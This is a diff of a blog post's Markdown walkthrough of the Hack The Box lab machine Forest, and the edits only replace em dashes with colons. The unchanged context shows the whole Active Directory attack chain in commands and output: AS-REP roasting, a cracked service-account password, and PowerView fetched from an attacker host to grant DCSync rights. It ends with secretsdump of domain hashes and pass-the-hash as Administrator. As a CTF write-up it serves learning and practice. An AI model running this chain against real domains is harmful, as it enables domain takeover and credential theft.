@@ -1,8 +1,8 @@
 +++
-title = "HTB — Forest"
+title = "HTB: Forest"
 date = "2026-05-05T00:00:00-05:00"
 tags = ["htb", "windows", "active-directory", "ldap", "kerberos", "as-rep-roasting", "bloodhound", "dcsync", "winrm", "retired"]
-description = "Walkthrough of Hack The Box Forest — LDAP and RPC enumeration against an Active Directory DC, AS-REP Roasting a service account with pre-auth disabled, then abusing Exchange Windows Permissions to grant DCSync rights and dump all domain hashes."
+description = "Walkthrough of Hack The Box Forest: LDAP and RPC enumeration against an Active Directory DC, AS-REP Roasting a service account with pre-auth disabled, then abusing Exchange Windows Permissions to grant DCSync rights and dump all domain hashes."
 draft = false
 +++
 
@@ -45,11 +45,11 @@ PORT     STATE SERVICE       VERSION
 9389/tcp open  mc-nmf        .NET Message Framing
 ```
 
-The port profile — DNS (53), Kerberos (88), LDAP (389/636/3268), RPC (135/593), SMB (445), and WinRM (5985) — is a domain controller. The LDAP banner confirms the domain: `htb.local`.
+The port profile: DNS (53), Kerberos (88), LDAP (389/636/3268), RPC (135/593), SMB (445), and WinRM (5985): is a domain controller. The LDAP banner confirms the domain: `htb.local`.
 
 ---
 
-## 2. LDAP Enumeration — Naming Contexts
+## 2. LDAP Enumeration: Naming Contexts
 
 Query the LDAP base object to confirm the domain structure:
 
@@ -65,11 +65,11 @@ namingContexts: DC=DomainDnsZones,DC=htb,DC=local
 namingContexts: DC=ForestDnsZones,DC=htb,DC=local
 ```
 
-Domain confirmed as `htb.local`. Anonymous LDAP bind is allowed — no credentials needed for basic enumeration.
+Domain confirmed as `htb.local`. Anonymous LDAP bind is allowed: no credentials needed for basic enumeration.
 
 ---
 
-## 3. RPC Enumeration — User List
+## 3. RPC Enumeration: User List
 
 Use `rpcclient` with a null session to enumerate domain users:
 
@@ -91,7 +91,7 @@ user:[mark] rid:[0x47f]
 user:[santi] rid:[0x480]
 ```
 
-The `SM_*` and `HealthMailbox*` accounts are Exchange service accounts — ignore them. The interesting accounts are the human users and the service account `svc-alfresco`.
+The `SM_*` and `HealthMailbox*` accounts are Exchange service accounts: ignore them. The interesting accounts are the human users and the service account `svc-alfresco`.
 
 Build a clean user list:
 
@@ -106,9 +106,9 @@ santi
 
 ---
 
-## 4. AS-REP Roasting — Capturing the Hash
+## 4. AS-REP Roasting: Capturing the Hash
 
-AS-REP Roasting targets accounts that have Kerberos pre-authentication disabled (`UF_DONT_REQUIRE_PREAUTH`). When pre-auth is off, the KDC will return an AS-REP encrypted with the account's password hash without verifying the requestor's identity first — meaning anyone can request it and attempt to crack it offline.
+AS-REP Roasting targets accounts that have Kerberos pre-authentication disabled (`UF_DONT_REQUIRE_PREAUTH`). When pre-auth is off, the KDC will return an AS-REP encrypted with the account's password hash without verifying the requestor's identity first: meaning anyone can request it and attempt to crack it offline.
 
 ```bash
 impacket-GetNPUsers -usersfile users.lst -dc-ip 10.10.10.161 htb.local/
@@ -143,7 +143,7 @@ Credentials: `svc-alfresco : s3rvice`
 
 ## 6. Initial Shell (WinRM)
 
-Port 5985 is open — WinRM is available. Connect with evil-winrm:
+Port 5985 is open: WinRM is available. Connect with evil-winrm:
 
 ```bash
 evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice
@@ -168,7 +168,7 @@ e5e4e47ae7022664cda6eb013fb0d9ed
 
 ---
 
-## 8. Privilege Escalation — BloodHound
+## 8. Privilege Escalation: BloodHound
 
 Collect AD data with SharpHound and import into BloodHound. The key finding is a path from `svc-alfresco` to Domain Admin:
 
@@ -180,20 +180,20 @@ svc-alfresco
               -> WriteDACL allows granting DCSync rights to any principal
 ```
 
-**Account Operators** is a built-in privileged group that can create users and add them to most non-protected groups — including **Exchange Windows Permissions**. That group holds a `WriteDACL` ACE on the root domain object, which means its members can modify the domain's access control list and grant themselves replication rights (DCSync).
+**Account Operators** is a built-in privileged group that can create users and add them to most non-protected groups: including **Exchange Windows Permissions**. That group holds a `WriteDACL` ACE on the root domain object, which means its members can modify the domain's access control list and grant themselves replication rights (DCSync).
 
 ---
 
-## 9. Exploiting the Path — DCSync
+## 9. Exploiting the Path: DCSync
 
-**Step 1** — Create a new user and add them to Exchange Windows Permissions:
+**Step 1**: Create a new user and add them to Exchange Windows Permissions:
 
 ```powershell
 net user attacker Sup3rS3cr3t! /add /domain
 net group "Exchange Windows Permissions" /add attacker
 ```
 
-**Step 2** — Download PowerView and grant DCSync rights to the new user:
+**Step 2**: Download PowerView and grant DCSync rights to the new user:
 
 ```powershell
 IWR http://<attacker-ip>/PowerView.ps1 -OutFile PowerView.ps1
@@ -204,7 +204,7 @@ $cred = New-Object System.Management.Automation.PSCredential('htb\attacker', $pa
 Add-DomainObjectAcl -Credential $cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity attacker -Rights DCSync
 ```
 
-**Step 3** — Run secretsdump to perform the DCSync and dump all hashes:
+**Step 3**: Run secretsdump to perform the DCSync and dump all hashes:
 
 ```bash
 impacket-secretsdump htb.local/attacker:Sup3rS3cr3t!@10.10.10.161
@@ -218,7 +218,7 @@ htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d
 
 ## 10. Root Flag
 
-Pass the Administrator NTLM hash directly with evil-winrm — no need to crack it:
+Pass the Administrator NTLM hash directly with evil-winrm: no need to crack it:
 
 ```bash
 evil-winrm -i 10.10.10.161 -u Administrator -H 32693b11e6aa90eb43d32c72a07ceea6
